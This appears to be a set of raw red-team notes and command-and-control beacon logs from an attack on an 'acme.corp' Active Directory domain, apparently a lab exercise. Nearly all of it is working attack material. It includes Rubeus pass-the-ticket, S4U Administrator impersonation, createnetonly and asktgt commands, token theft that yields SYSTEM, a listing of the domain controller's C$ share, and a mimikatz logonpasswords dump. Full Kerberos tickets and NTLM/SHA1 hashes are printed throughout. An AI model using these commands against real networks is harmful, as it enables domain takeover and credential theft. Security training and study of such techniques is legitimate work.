[04/23 14:40:13] [*] Tasked beacon to run .NET program: Rubeus.exe ptt /luid:0x2ecfbf /ticket:doIFTjCCBUqgAwIBBaEDAgEWooIEYTCCBF1hggRZMIIEVaADAgEFoQsbCUFDTUUuQ09SUKIeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQo4IEHzCCBBugAwIBEqEDAgECooIEDQSCBAnX4CGtG3f7bLvBZJP2m00A3uEQ6rLNAJQDuWfycc+6iSlOQ2EahiaNgC08OMgWlcFIfWGduZji1KYkMLo5hdUqhtqMsDX+wcgwAhPtBLpwo6R5v1rZbcCBUC6xkR98vCLWdSaFiQOO98tAG7Nko32GEGsKuGuO59d7jVSV7uQLjNWABCKH8lhsf/JgF4+YkmbXieHvT9goVab8Vy8nB95uD/C7YpR3Y4Xs82Rc5/GPbgZnR9Bjg4iHijHJDl+OlPdxYJySTsfUAwku4n0/c2n6N6BELfR4YGVhz5hgT4uzBpC4jaPHjHeqFdqcUC/KlhzB0w6jsCVPWl+S1mY7X86OJ2Ih4y9ETZASN4EFcvKlfGN1biqWbhkqKvDLCLzsiLvBrPVEe2rClfF16H/J7X6v+m5tMFD02/inqPzGfBhbcMgwcRqV/0CaxgMdgIb2zqVGxOFG+Ha56pB5Ce+RHslHkkrYtT6juJOmBddP5KdaXV97haArCywBNzqWJySx3apvhSMZUMWTodjFi7nTwCeuLj43GOmD0nKZUBVuq6TXHfwXdY5WM+Tnw/V4pMeKH/SwiZ1XW+opHEhXHT8tY2+AyKYT3JDEA0ZcEOXhtSTVyUWv6gfV5b3y7cdcCZ2oZ4Hr5DnpRbg17jcx/sZTzlDiDjIvJXX7t+MNNgsBO1R+Lh5FUiBrL9UV62PncJrlCHJ9XDXFso3MYtgmcvdWiLu5yJWVS2GDEM5EIwagyjgB59PfwnJlrjchpl8daSllUnIbKC0cgh8UFU3aO9AwXiOaMK02qcKpdJkGgiPw1Rpwh+YKYkHoi6Uj3OLSgTFLPK0ah9pLXsSnAgK5W37XjHIv+Jarg0EyXo8gMIRL6EXdskeEeO+VHfH9PuIottqc0oETNInUPTKIdLf0YxM/LB367IrkUmFMdwFXSDfVJsDMd+s8/iFD3F9papLqeLNn4QMi8vl3CGH9pHO1y0269rPUX4tHncfcD9lSUmc0t84zzvlg/NNexVI9beK+MBk7qdIK22HtfC9BiRFHcOVG9ZlM1dKKj3nbaEbtdVZZ2AxkU9nT2896r6IfXkjLGZANOKtgh5zf63k6AUi9P+NU/EFb1/pRcQnOBiQEwuKPZQ6yJnGeiY18DybtLVp9riboEnHhwg1YexcRT16GPOP08szVBUpfeBYcUpJ58PuJCUH27lPnbK2cbD9wrW0lbsjBGqYD6FwpEWadBBe7AzC/mYSWwaUUQF74D4+BhRr9QYxLyeMal5HYRCGEU32WttLQzstRTjtEpbO8d9nG3v+SPd10U01ZF2aNgjYepbUd1q2lu6RI9RzTHpFueVXnNbej5OkjWz6KRaU3QqigWhqjyQaZGrN1b8rjlSt/o4HYMIHVoAMCAQCigc0Egcp9gccwgcSggcEwgb4wgbugKzApoAMCARKhIgQgcaeVasmHl4uVKr//mZEgVBM6dfCKZWNpB7iztHyJKg+hCxsJQUNNRS5DT1JQohAwDqADAgEBoQcwBRsDREMkowcDBQBgoQAApREYDzIwMjUwNDIzMDgzNjM4WqYRGA8yMDI1MDQyMzE4MzUzN1qnERgPMjAyNTA0MzAwODM1MzdaqAsbCUFDTUUuQ09SUKkeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQ
[04/23 14:40:14] [+] host called home, sent: 559458 bytes
[04/23 14:40:15] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Import Ticket
[*] Target LUID: 0x2ecfbf
[+] Ticket successfully imported!

```





```
      doIFTjCCBUqgAwIBBaEDAgEWooIEYTCCBF1hggRZMIIEVaADAgEFoQsbCUFDTUUuQ09SUKIeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQo4IEHzCCBBugAwIBEqEDAgECooIEDQSCBAlaQppvpRhb0+5bIpZWuHqdYGYU1l9fMfY72dyOON2PROGZE9JNa9xeEJXZgAPLULyBv5EzW+4VTRxRSEqpNEQr8jhPGMuPWbD4eG9Exti83v9BG9Twhz6dIO1ID6iJryc8/eAsLXdOJ7j7qGFqT7qf5pkxsL8op6rquOdB+sNVnQ9xcxsWGyvmCUYOrWswuGCJXiCVFkXVj6xOt8FY+E+5cuF8PoaNz09M/KDW9S0BU9D//uZub6nxwHzGiD0gHoDvbHQLyZHY2dLK3YFOcAeW+AHNNh2OMhuWOp0LbjSAaYL0/zVzNG0y/RKWF+gKe3eutltoDG4ZcoUofZXS180fXaQYJn/rlvq4cwDSUi2acBfz3ACsSCtjbqFO/+7w+DH84lIueYwQBVIiCLmCgeOC5V5er78fALTtMV8BvyOpURQPHjM+ka7byzRastN/1ohYyESnxwoPCP+lTiZp4FPK5tfF6eiJbc6RUmnzzvgvJrr8Dp5KrcdDJ9a1iefXDqaEwYAnPu/DEBd2i0imfX+PoXF1Fs/VO2L+UkREUq5i6rwuOLJt+IZF09p8AGYVMABPvlAVTe8omd1B9pDi42/DpRr6dw38Uq/9st2yFRRJepyMeVp02NXexJbxWuQ9bhPYK/eaZPEO+RJK/Zxzj8m0pn8Lw264zeveQVp6jxac1/YgZoR/0PN+14AB0nGOrWOzBJ5TkDu4093Kij++o4hBX2bCc13WxzC0/iySVZof0IEjClb7+7/bvnY+U/39MndyGjcnCSxcSQbUZ2NvufG9ACBUkT/frn5v/efAGLWMoX3ZM/Mv17d3M5BAdEnElBYr0caPv18rOfBGexHTfv3nPbaDWdqE3HfVWrYxELmY/vpkOF1xPP22Iu7jxke3Oz7nGL11rf1W55Jj00ZDaruBcXXk82i6iXrMjFZ9qm/IMdP8sGpqN510+J6655N4XdQbdMmTYTszSlt3dKh374HUHZKpkwAPHFB60bkwY5TO8bEK16HEuuYix/7CLVxnfYBEJ/UkZAXyfmgTygXdfl6VgZ+0kWppL4TE2lEFnkULXVPcAV+an3wfleFR6JRWkgCARrOpt99xYwsbFtl4wHveKg0kfacula353EKmnXABAhFW4br/osFzXfiCzoGx5PrEDe5Srsf4+bVgH700om/keMItLeKbyYk1H2WwMK85liHVBTynHOZcn3YnsHzM+pcHRFY9ZNWFycDEusXGh5XCPH2DWlQtU2iijPwrxYY1NfrGc06AHNnlocWlVNT96q6HB2BypOImVd5vGXlt/ZBD/0OQIMXVcjtzgZKubRdPQJclbILz5BETW07eWC1pmZC+YMBkrBqAutLqyWd0WOJlLmT7Sfe654T7o4HYMIHVoAMCAQCigc0Egcp9gccwgcSggcEwgb4wgbugKzApoAMCARKhIgQgcaeVasmHl4uVKr//mZEgVBM6dfCKZWNpB7iztHyJKg+hCxsJQUNNRS5DT1JQohAwDqADAgEBoQcwBRsDREMkowcDBQBgoQAApREYDzIwMjUwNDIzMTQ0MDQ5WqYRGA8yMDI1MDQyNDAwMzk0OFqnERgPMjAyNTA0MzAwODM1MzdaqAsbCUFDTUUuQ09SUKkeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQ

```


```
doIFTjCCBUqgAwIBBaEDAgEWooIEYTCCBF1hggRZMIIEVaADAgEFoQsbCUFDTUUuQ09SUKIeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQo4IEHzCCBBugAwIBEqEDAgECooIEDQSCBAlaQppvpRhb0+5bIpZWuHqdYGYU1l9fMfY72dyOON2PROGZE9JNa9xeEJXZgAPLULyBv5EzW+4VTRxRSEqpNEQr8jhPGMuPWbD4eG9Exti83v9BG9Twhz6dIO1ID6iJryc8/eAsLXdOJ7j7qGFqT7qf5pkxsL8op6rquOdB+sNVnQ9xcxsWGyvmCUYOrWswuGCJXiCVFkXVj6xOt8FY+E+5cuF8PoaNz09M/KDW9S0BU9D//uZub6nxwHzGiD0gHoDvbHQLyZHY2dLK3YFOcAeW+AHNNh2OMhuWOp0LbjSAaYL0/zVzNG0y/RKWF+gKe3eutltoDG4ZcoUofZXS180fXaQYJn/rlvq4cwDSUi2acBfz3ACsSCtjbqFO/+7w+DH84lIueYwQBVIiCLmCgeOC5V5er78fALTtMV8BvyOpURQPHjM+ka7byzRastN/1ohYyESnxwoPCP+lTiZp4FPK5tfF6eiJbc6RUmnzzvgvJrr8Dp5KrcdDJ9a1iefXDqaEwYAnPu/DEBd2i0imfX+PoXF1Fs/VO2L+UkREUq5i6rwuOLJt+IZF09p8AGYVMABPvlAVTe8omd1B9pDi42/DpRr6dw38Uq/9st2yFRRJepyMeVp02NXexJbxWuQ9bhPYK/eaZPEO+RJK/Zxzj8m0pn8Lw264zeveQVp6jxac1/YgZoR/0PN+14AB0nGOrWOzBJ5TkDu4093Kij++o4hBX2bCc13WxzC0/iySVZof0IEjClb7+7/bvnY+U/39MndyGjcnCSxcSQbUZ2NvufG9ACBUkT/frn5v/efAGLWMoX3ZM/Mv17d3M5BAdEnElBYr0caPv18rOfBGexHTfv3nPbaDWdqE3HfVWrYxELmY/vpkOF1xPP22Iu7jxke3Oz7nGL11rf1W55Jj00ZDaruBcXXk82i6iXrMjFZ9qm/IMdP8sGpqN510+J6655N4XdQbdMmTYTszSlt3dKh374HUHZKpkwAPHFB60bkwY5TO8bEK16HEuuYix/7CLVxnfYBEJ/UkZAXyfmgTygXdfl6VgZ+0kWppL4TE2lEFnkULXVPcAV+an3wfleFR6JRWkgCARrOpt99xYwsbFtl4wHveKg0kfacula353EKmnXABAhFW4br/osFzXfiCzoGx5PrEDe5Srsf4+bVgH700om/keMItLeKbyYk1H2WwMK85liHVBTynHOZcn3YnsHzM+pcHRFY9ZNWFycDEusXGh5XCPH2DWlQtU2iijPwrxYY1NfrGc06AHNnlocWlVNT96q6HB2BypOImVd5vGXlt/ZBD/0OQIMXVcjtzgZKubRdPQJclbILz5BETW07eWC1pmZC+YMBkrBqAutLqyWd0WOJlLmT7Sfe654T7o4HYMIHVoAMCAQCigc0Egcp9gccwgcSggcEwgb4wgbugKzApoAMCARKhIgQgcaeVasmHl4uVKr//mZEgVBM6dfCKZWNpB7iztHyJKg+hCxsJQUNNRS5DT1JQohAwDqADAgEBoQcwBRsDREMkowcDBQBgoQAApREYDzIwMjUwNDIzMTQ0MDQ5WqYRGA8yMDI1MDQyNDAwMzk0OFqnERgPMjAyNTA0MzAwODM1MzdaqAsbCUFDTUUuQ09SUKkeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQ
```


```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser: /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap
```


```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/dc.acme.corp /user:DC$ /ticket:doIFTjCCBUqgAwIBBaEDAgEWooIEYTCCBF1hggRZMIIEVaADAgEFoQsbCUFDTUUuQ09SUKIeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQo4IEHzCCBBugAwIBEqEDAgECooIEDQSCBAlaQppvpRhb0+5bIpZWuHqdYGYU1l9fMfY72dyOON2PROGZE9JNa9xeEJXZgAPLULyBv5EzW+4VTRxRSEqpNEQr8jhPGMuPWbD4eG9Exti83v9BG9Twhz6dIO1ID6iJryc8/eAsLXdOJ7j7qGFqT7qf5pkxsL8op6rquOdB+sNVnQ9xcxsWGyvmCUYOrWswuGCJXiCVFkXVj6xOt8FY+E+5cuF8PoaNz09M/KDW9S0BU9D//uZub6nxwHzGiD0gHoDvbHQLyZHY2dLK3YFOcAeW+AHNNh2OMhuWOp0LbjSAaYL0/zVzNG0y/RKWF+gKe3eutltoDG4ZcoUofZXS180fXaQYJn/rlvq4cwDSUi2acBfz3ACsSCtjbqFO/+7w+DH84lIueYwQBVIiCLmCgeOC5V5er78fALTtMV8BvyOpURQPHjM+ka7byzRastN/1ohYyESnxwoPCP+lTiZp4FPK5tfF6eiJbc6RUmnzzvgvJrr8Dp5KrcdDJ9a1iefXDqaEwYAnPu/DEBd2i0imfX+PoXF1Fs/VO2L+UkREUq5i6rwuOLJt+IZF09p8AGYVMABPvlAVTe8omd1B9pDi42/DpRr6dw38Uq/9st2yFRRJepyMeVp02NXexJbxWuQ9bhPYK/eaZPEO+RJK/Zxzj8m0pn8Lw264zeveQVp6jxac1/YgZoR/0PN+14AB0nGOrWOzBJ5TkDu4093Kij++o4hBX2bCc13WxzC0/iySVZof0IEjClb7+7/bvnY+U/39MndyGjcnCSxcSQbUZ2NvufG9ACBUkT/frn5v/efAGLWMoX3ZM/Mv17d3M5BAdEnElBYr0caPv18rOfBGexHTfv3nPbaDWdqE3HfVWrYxELmY/vpkOF1xPP22Iu7jxke3Oz7nGL11rf1W55Jj00ZDaruBcXXk82i6iXrMjFZ9qm/IMdP8sGpqN510+J6655N4XdQbdMmTYTszSlt3dKh374HUHZKpkwAPHFB60bkwY5TO8bEK16HEuuYix/7CLVxnfYBEJ/UkZAXyfmgTygXdfl6VgZ+0kWppL4TE2lEFnkULXVPcAV+an3wfleFR6JRWkgCARrOpt99xYwsbFtl4wHveKg0kfacula353EKmnXABAhFW4br/osFzXfiCzoGx5PrEDe5Srsf4+bVgH700om/keMItLeKbyYk1H2WwMK85liHVBTynHOZcn3YnsHzM+pcHRFY9ZNWFycDEusXGh5XCPH2DWlQtU2iijPwrxYY1NfrGc06AHNnlocWlVNT96q6HB2BypOImVd5vGXlt/ZBD/0OQIMXVcjtzgZKubRdPQJclbILz5BETW07eWC1pmZC+YMBkrBqAutLqyWd0WOJlLmT7Sfe654T7o4HYMIHVoAMCAQCigc0Egcp9gccwgcSggcEwgb4wgbugKzApoAMCARKhIgQgcaeVasmHl4uVKr//mZEgVBM6dfCKZWNpB7iztHyJKg+hCxsJQUNNRS5DT1JQohAwDqADAgEBoQcwBRsDREMkowcDBQBgoQAApREYDzIwMjUwNDIzMTQ0MDQ5WqYRGA8yMDI1MDQyNDAwMzk0OFqnERgPMjAyNTA0MzAwODM1MzdaqAsbCUFDTUUuQ09SUKkeMBygAwIBAqEVMBMbBmtyYnRndBsJQUNNRS5DT1JQ /nowrap
```



```
doIFvDCCBbigAwIBBaEDAgEWooIExDCCBMBhggS8MIIEuKADAgEFoQsbCUFDTUUuQ09SUKIfMB2gAwIBAaEWMBQbBGNpZnMbDGRjLmFjbWUuY29ycKOCBIEwggR9oAMCARKhAwIBA6KCBG8EggRrgGquIaW6FFibLW5T6Lfzhg7gXySv1BWiW8kLHYitUMk5CwS3Pk5EcCHwoqinnsnLJda344ORclQmqHHrAFc1NxEM1GRtQT5w2WeOVJSu1D3+WfGSdQK5OMz4BVRYZUEu8UqOLDmhXoNMjKUBQLxGTxzpkjqQU4CnKpAAtXDMT6OwNTgeUMv9k4AGjWY3BObvJO7+VN/cYPvheMUDL9pTNcaimXTdMr8VzBzNJ8j3Hp7YsS5Sr69wZ3128Kme064NvejjFWNBL9Gnh8SLdj88d6Xr5Sc6Edf8N4XqA0xo9thvbEHwzYOmFl3UONmA+TGx2o1PSCL6csJzGqpEjDyfOf1ueOqaUowRKkzBtWniH75Lh29Sja9E+SBHOyLd0Z4FfCsDdMsdqjEkN27EipOw5Vm7jYXUkwFq5LMCdcVrxqndbuLSIynSJFCgBnjRioFKLr/3WRryhtCBNo4zRGcOVVHcjW03FECd05WIaifwB9DmLpEH/AK8ec2f5cgkiF2QbGNwV5msNnI22DTCX6YV2pwlN7ouaTbckANatTa6dHM5VKxKsAuttmQhRu+XIgGY5t12jS4cZXJatjGZ90BdcGUObDue5AoxTXua9Oh808sMIMHia+lXyIf69PiConMG1IzzybzIU6td8V4Ip33IzyWG3O61DqFGAn6XhHy5INi09Z0bJVeE8ywfcbVTKhwbqxNWXJcOloab4bLCANEWYkzVMn7xdOwwl+NfqnT7n+Gro3L74iouckoDtFdAeJ2dEtdF8XbL8IfRMXYtwbkpf/mNWWrDAqL6tQbRewLg7JnMnHBe48B3e58biDoLqwbx22I8tvmGZvV1Mfi3NQnNXn8VPrrg+kY7dRHf9zJ8mgey13dZ/J1n2gucJplb8cWNaTX8+Kl2IBLm0ZC1QdwrDs558qOl5ZZj5cJOn//7TfB5RUBulU6hI+x9SUz94xzwcLL/OpkE6j38qwrz5uyZWRH25rHFv9uKvkftXMAhNb3isrUMQxHOQP6Fl7asxjENYAqSB30IdLqPR0BVz3+5VuadGenTJH5PCmJnHahITsUQmBgMq7Ps3pHVX7K2DiIJIJpVKqBGrjUYDKJORFfuzclzzmVjWeW8qrbMGnGgkNMKxOABH6jkRaPZgHChVFTBBwkyI246hL3AHXMFaO7WOZVy2cN9CWxiIUsjmq/A0JW5H/KaSRd1mS9uLn38tscqqyaw0Ia/Qm8Tq/iuZqcorso4A/Vgd6n4zC52/VLP7Y2q7naQGQbpiymyLTlBaKu9dEeueRjwe994nd+f8MezWy2uxmJwNF6/Un7Cbn7LtKsddW1yawfIaerGgF1GXFvZzHRr9YpeyZzOTnDFgTr+7zJsplAv9bm65Cx2QktnuKmr3KukRhMsY/ohzqx606lpEUHxoE+R5M1EKIXPhNwGsWNJfSivfNGZEcAnHlyMZJc8YnlilWBboXr8wplMDFE6OY4cbfk+vRDWI3lk44cAzf3pLQTRJuMttb+Xo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgg0t5tW7YvB4Lb5fzNI05No8yXekyhA2Ig4egNA+xICShCxsJQUNNRS5DT1JQohowGKADAgEKoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAYKUAAKURGA8yMDI1MDQyMzE1MDI1M1qmERgPMjAyNTA0MjQwMDM5NDhapxEYDzIwMjUwNDMwMDgzNTM3WqgLGwlBQ01FLkNPUlCpHzAdoAMCAQGhFjAUGwRjaWZzGwxkYy5hY21lLmNvcnA=

```



```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:ACME /username:Administrator /password:FakePass /ticket:doIFvDCCBbigAwIBBaEDAgEWooIExDCCBMBhggS8MIIEuKADAgEFoQsbCUFDTUUuQ09SUKIfMB2gAwIBAaEWMBQbBGNpZnMbDGRjLmFjbWUuY29ycKOCBIEwggR9oAMCARKhAwIBA6KCBG8EggRrgGquIaW6FFibLW5T6Lfzhg7gXySv1BWiW8kLHYitUMk5CwS3Pk5EcCHwoqinnsnLJda344ORclQmqHHrAFc1NxEM1GRtQT5w2WeOVJSu1D3+WfGSdQK5OMz4BVRYZUEu8UqOLDmhXoNMjKUBQLxGTxzpkjqQU4CnKpAAtXDMT6OwNTgeUMv9k4AGjWY3BObvJO7+VN/cYPvheMUDL9pTNcaimXTdMr8VzBzNJ8j3Hp7YsS5Sr69wZ3128Kme064NvejjFWNBL9Gnh8SLdj88d6Xr5Sc6Edf8N4XqA0xo9thvbEHwzYOmFl3UONmA+TGx2o1PSCL6csJzGqpEjDyfOf1ueOqaUowRKkzBtWniH75Lh29Sja9E+SBHOyLd0Z4FfCsDdMsdqjEkN27EipOw5Vm7jYXUkwFq5LMCdcVrxqndbuLSIynSJFCgBnjRioFKLr/3WRryhtCBNo4zRGcOVVHcjW03FECd05WIaifwB9DmLpEH/AK8ec2f5cgkiF2QbGNwV5msNnI22DTCX6YV2pwlN7ouaTbckANatTa6dHM5VKxKsAuttmQhRu+XIgGY5t12jS4cZXJatjGZ90BdcGUObDue5AoxTXua9Oh808sMIMHia+lXyIf69PiConMG1IzzybzIU6td8V4Ip33IzyWG3O61DqFGAn6XhHy5INi09Z0bJVeE8ywfcbVTKhwbqxNWXJcOloab4bLCANEWYkzVMn7xdOwwl+NfqnT7n+Gro3L74iouckoDtFdAeJ2dEtdF8XbL8IfRMXYtwbkpf/mNWWrDAqL6tQbRewLg7JnMnHBe48B3e58biDoLqwbx22I8tvmGZvV1Mfi3NQnNXn8VPrrg+kY7dRHf9zJ8mgey13dZ/J1n2gucJplb8cWNaTX8+Kl2IBLm0ZC1QdwrDs558qOl5ZZj5cJOn//7TfB5RUBulU6hI+x9SUz94xzwcLL/OpkE6j38qwrz5uyZWRH25rHFv9uKvkftXMAhNb3isrUMQxHOQP6Fl7asxjENYAqSB30IdLqPR0BVz3+5VuadGenTJH5PCmJnHahITsUQmBgMq7Ps3pHVX7K2DiIJIJpVKqBGrjUYDKJORFfuzclzzmVjWeW8qrbMGnGgkNMKxOABH6jkRaPZgHChVFTBBwkyI246hL3AHXMFaO7WOZVy2cN9CWxiIUsjmq/A0JW5H/KaSRd1mS9uLn38tscqqyaw0Ia/Qm8Tq/iuZqcorso4A/Vgd6n4zC52/VLP7Y2q7naQGQbpiymyLTlBaKu9dEeueRjwe994nd+f8MezWy2uxmJwNF6/Un7Cbn7LtKsddW1yawfIaerGgF1GXFvZzHRr9YpeyZzOTnDFgTr+7zJsplAv9bm65Cx2QktnuKmr3KukRhMsY/ohzqx606lpEUHxoE+R5M1EKIXPhNwGsWNJfSivfNGZEcAnHlyMZJc8YnlilWBboXr8wplMDFE6OY4cbfk+vRDWI3lk44cAzf3pLQTRJuMttb+Xo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgg0t5tW7YvB4Lb5fzNI05No8yXekyhA2Ig4egNA+xICShCxsJQUNNRS5DT1JQohowGKADAgEKoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAYKUAAKURGA8yMDI1MDQyMzE1MDI1M1qmERgPMjAyNTA0MjQwMDM5NDhapxEYDzIwMjUwNDMwMDgzNTM3WqgLGwlBQ01FLkNPUlCpHzAdoAMCAQGhFjAUGwRjaWZzGwxkYy5hY21lLmNvcnA=
```




```
[04/23 16:04:26] [*] Tasked beacon to run .NET program: Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:ACME /username:Administrator /password:FakePass /ticket:doIFvDCCB[...]nA=

[04/23 16:04:29] [+] host called home, sent: 559930 bytes
[04/23 16:04:30] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Create Process (/netonly)


[*] Using ACME\Administrator:FakePass

[*] Showing process : False
[*] Username        : Administrator
[*] Domain          : ACME
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2640
[+] Ticket successfully imported!
[+] LUID            : 0x38fdc6

[04/23 16:04:40] beacon> steal_token 2640
[04/23 16:04:40] [*] Tasked beacon to steal token from PID 2640
[04/23 16:04:41] [+] host called home, sent: 12 bytes
[04/23 16:04:41] [+] Impersonated NT AUTHORITY\SYSTEM
[04/23 16:04:48] beacon> ls \\dc.acme.corp\C$
[04/23 16:04:48] [*] Tasked beacon to list files in \\dc.acme.corp\C$
[04/23 16:04:49] [+] host called home, sent: 35 bytes
[04/23 16:04:49] [*] Listing: \\dc.acme.corp\C$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     10/06/2022 10:19:06   $Recycle.Bin
          dir     09/14/2022 16:07:20   $WinREAgent
          dir     09/14/2022 16:18:55   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/19/2021 06:35:15   Program Files
          dir     09/14/2022 15:19:23   Program Files (x86)
          dir     10/10/2022 11:53:43   ProgramData
          dir     10/06/2022 10:08:02   Recovery
          dir     10/06/2022 10:32:08   System Volume Information
          dir     10/06/2022 10:10:52   Users
          dir     10/06/2022 10:27:28   Windows
 427kb    fil     09/14/2022 16:13:26   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     04/23/2025 08:34:47   DumpStack.log.tmp
 384mb    fil     04/23/2025 08:34:47   pagefile.sys
```





to pass the net only command easier just slap /ptt




```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:administrator /domain:acme.corp /ntlm:28aef4d9982c20c1c535472c5972389b /nowrap
```




```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:LDAP/dc.acme.corp,cifs/dc.acme.corp,HOST/dc.acme.corp,RPCSS/dc.acme.corp,HTTP/DC.ACME.CORP /domain:acme.corp /dc:dc.acme.corp /user:administrator /password:28aef4d9982c20c1c535472c5972389b /nowrap
```



```
doIFvDCCBbigAwIBBaEDAgEWooIExDCCBMBhggS8MIIEuKADAgEFoQsbCUFDTUUuQ09SUKIfMB2gAwIBAqEWMBQbBEhUVFAbDERDLkFDTUUuQ09SUKOCBIEwggR9oAMCARKhAwIBA6KCBG8EggRreUrGa0z4lBsHR7W7O+reCgi2SXOuXRmjB+W0CVa4DF1H/a2DJhaWy2BTszgfK2VBDLWhqXLHg9VfSo8H3su80j4tXcfoJHtFOL0vZCY7N0L6jHxIIew/E87EpWLzwyaNsP5jmJ8xhYl8ZcroSWrVX4I4FcHFrzMl8m5w4N3YNbLlDdqNeIEPyN6s+b8938hYpiO/xkbznjbxgUiFvkf1cPOFWX3PRej+H907XMAHFgezT6reZA/iUGBrNqRWwr4PA2ds158144jLutq5Tq13X5LXpz0LASjR2IBwTw4aTerh0WcsFTBVW+yL5esKgmvB1X3RZu2Yy1aKvDwp6V7wuw8KilWz24j9dREWUhdNJpxnbYjonJ/tMHiPd6WWyGzUJnvkpnT2lxzXtpLO7g0Bl2Us62GzKVaIgWVoOxv7XicteDCkerqoPIyrGYWcfIAKVe7uCcK7EQcIltQUmANf75eqyEa7x1BTcHfIfvmD1CFSYXD870WOx2fDdWeV2L5rGAPdUuL1SpXwsNyC2QnNLqJRwOJ+KWGT1lYBSyg263g+L2PVxEWEBbclx3tSi7mm0B6PsMaYYZkkvijffv8YJTTF+wjYnIXmLyI6uRgMGRodTduHzgEyznpjemyPVW2YCNGSOyPg8ZROWJ8aliQsiRA9+q0tzAQRJx27EpOntty/hS8tPqPF0A0WwE5ksOHqohpRAa5GUV55aRcJ8yOY18XHs5fow4z4gdfUpwt6rOeNKM6uOuQ6YD1FCBYtxeNry69y8nzYkcpW20OxVky04YnO0lF9wwdNXDB3Vbq6oTsDipdnD/o0ddEXJPoWmhm7zosxGsoH3FSzhjw6NpvCcRaMvtngc1Yr7lnkfeckuFQ9r1VtjJ1mDSKWZsqjpcAyB9o+nSsDx4UnSa+mvmy29oVTp4ujY8zpONTbbuS8iDFOmVbXApOfM9kMRS8XSgnxnjErS/D1f+TeL8feVZsMoy8YDk/g5oCCjWTCLfX7DP2M7OmhUOBudlYqlrnC5Icf9AvwkFohiSigQ7lylVlIst4lGLPsV31Lg+ZtfjoZsdGQnsuJ5uxhY23GwzpoIJk8jMCmc3HDq+pQt31bCVYppuh0NnhemdSqyu522VhmOjla5jTlHjl+QHpDU4HD1SIV41Yngbm7UPQdGSjPWHdTTvjCb/PG9SuPd/Yj+DQuhOZ9kqbRJoDM8oxT1rRBsmdUptpdKlVjyItXEWi74ArRN2v/V27awiqsfm3b2OrYHlGdnUSnlUtu08MrR79tvKqDaFXntqJC0gtFsH3r8ZVuqpl9QkdQCH6UgpTYo98ihqQOgf2k/U00pEgLSLnLFc1NBJxW83MS+aSsCT7AXHfaMaQKHN2/HJjqOKghMqEq/hJH+5MMNcoPa1r/uiBo5MDVw1ZFfYVL+wCBMY2iRMzwWNarTPzbu7wursgdK07D9QpebnYk2WIB6tSRcsYrwxLfPrkSx58A906eXhqdaGoD37cdzgmWMkXxUdjJo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgisIEXBW/dgjpZ0nsspUKoxyikp9T8vhBJCNWhqQ1fc+hCxsJQUNNRS5DT1JQohowGKADAgEBoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKUAAKURGA8yMDI1MDQyNDA4MjUxM1qmERgPMjAyNTA0MjQxODE1NTlapxEYDzIwMjUwNTAxMDgxNTU5WqgLGwlBQ01FLkNPUlCpHzAdoAMCAQKhFjAUGwRIVFRQGwxEQy5BQ01FLkNPUlA=
```






```python
[04/24 12:56:58] beacon> mimikatz sekurlsa::logonpasswords
[04/24 12:57:01] [*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[04/24 12:57:04] [+] host called home, sent: 815435 bytes
[04/24 12:57:05] [+] received output:

Authentication Id : 0 ; 44143 (00000000:0000ac6f)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:03 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : DC$
	 * Domain   : ACME
	 * NTLM     : 1989ea30a613b7e0e8dc59aa41872df1
	 * SHA1     : 77ed613e8efd0e70e3bf6f66328a40dd37b70524
	tspkg :	
	wdigest :	
	 * Username : DC$
	 * Domain   : ACME
	 * Password : (null)
	kerberos :	
	 * Username : DC$
	 * Domain   : acme.corp
